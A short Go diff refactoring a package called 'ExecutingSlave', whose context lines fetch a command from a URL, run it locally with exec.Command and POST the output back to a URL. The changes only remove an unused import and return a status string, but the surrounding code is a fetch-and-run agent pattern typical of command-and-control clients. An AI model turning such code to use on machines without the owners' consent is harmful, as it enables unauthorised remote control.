@@ -3,7 +3,6 @@ package ExecutingSlave
 import (
 	"bytes"
 	"encoding/json"
-	"fmt"
 	"io/ioutil"
 	"net/http"
 	"os/exec"
@@ -34,7 +33,6 @@ func recv_cmd(url string) (*exec.Cmd ){
 		panic(atTheDisco)
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
-	//bodys := string(body)
 
 	json.Unmarshal(body, &data)
 	cmd := exec.Command(data.Args[0], "")
@@ -43,11 +41,11 @@ func recv_cmd(url string) (*exec.Cmd ){
 	return cmd
 }
 
-func send_cmd(url string,result []byte) (){
+func send_cmd(url string,result []byte) (string){
   r := strings.NewReader(string(result))
   resp,err := http.Post(url,"text",r)
   if err != nil{
     panic(err)
   }
-  fmt.Println(resp.Status)
+  return resp.Status
 }
